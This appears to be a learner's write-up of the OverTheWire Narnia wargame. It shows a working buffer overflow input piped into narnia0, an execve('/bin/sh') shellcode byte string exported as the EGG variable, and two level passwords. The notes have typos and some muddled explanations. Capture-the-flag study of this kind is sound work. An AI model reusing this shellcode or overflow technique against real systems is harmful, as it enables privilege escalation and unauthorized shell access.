# Narnia
### basic game info
```
levels: narnia0 narnia1...
narnia.labs.overthewire.org on port 2226

passwords at:
/etc/narnia_pass/
```
### level 1
#### attempts
1. looked for suspicious ports
2. cat the narnia1 password.
3. `You'll get the source code of each level to make it easier for you to spot the vuln and abuse it.`
   meaning there is a source code inside this machine lets find it... <br>
when running `find . | grep narnia`, you I found narnia0.c and its executable! <br>

the program is a simple buffer overflow the given buffer is 20 bytes and 
after that there is the target value. if you sucessfully overflow you get a shell.<br>
`setreuid(geteuid() geteuid())`, sets a real and effective user IDs of the calling process.<br>
The calling process will be the next level, because you can a SUID flag on the executable.

#### buffer overflow attempts
given a buff[20] and a value before it. the stack would look like this.<br>
| var      | high memory addr<br>
| buff[20] | low memory addr<br>

The program input 24 chars of string into buff, which is already a buffer overflow.

1. tried to enter `20*a+0xdeadbeef` <br> 
    val = edx0<br>
    buff = aaaaaaaaaaaaaaaaaaaa0xde<br>
    those there are the reverse of each other<br>
    target val = 0xdeadbeef = 3735928559<br>

    the input deadbeef should be reversed and without `0x`<br>
    this method worked partly, var = hex(beef) we need to eneter beef as hex reversed<br>
    `0xf0xe0xe0xb0xd0xa0xe0xd`
    
## solution
#### steps
- from the first input `20*a+0xdeadbeef`, we can infer three things:<br>
  1. the input only scan 4 more bytes
  2. the output is reversed meaning the order is little indian
  3. 0x would not help use get values as hex values
- now deadbeef would be in little indian every byte at the end goes to the start
- efbeadde in hex. in the bash shell hex can be represent by \x.
- `aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde`
- lastly in order to stay inside the shell we need to run a command inside the new shell
- `(echo -e "aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde"; cat;) | ./narnia0` this is called command group.



## Level 2
```C
#include <stdio.h>

int main()
{
    int (*ret)();

    if(getenv("EGG")==NULL)
    {
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```
### anlays
- getenv() - gets the value of the given global variable<br>
  they use getenv() instead of secure_getenv(), to enable not only the creator of this exe to enter environment variable.
- to set environment variables in linux, `EGG="test"`, `export` keywoard would make the variable scope inside all derive process.
- we can only pass a function that returns integer and doesn't get parameters and is built in the stdio.h library.<br>
  tested system and printf functions but the function throws segmentation fault.
- segmentation fault -> you access  memory that "does not belong to you".
- 
### Attemps
- add a `export EGG="system(\"bin/sh\")"`, didn't work. The idea is to pass that will run the command `cat /etc/narnia_pass/narnia2`
- use bash functions, `export EGG="expliot(){cat /etc/narnia_pass/narnia2}"`, no luck...
- use c functions, the problem is that we need to create a function declaration a line before.
  ```C
  int main() 
  {
    int (*ret)();
    
    int test() { printf("s"); } 

    ret = test;
    ret();
    return 0;
  }
  ```
### Solusion 
to execute the a shell he passed a python -c with print that prints the bytes of execve(/bin/sh).<br>
```C
export EGG=`python -c 'print "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"'`
export EGG=$(python -c 'print "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"')
```
He used https://www.exploit-db.com/exploits/44594 for the byte array.<br>
The new idea for solving this level is `shellcoding`, for further info see `pwn.md`.
### Passwords
level
- 0 -> `efeidiedae` : no time + help
- 0 -> `nairiepecu` : no time + help



## Terms
- real uid: the user ID
- effective uid: id can give the current user root privilage, with files.
- saved uid: id to lower your privilage inside a process.

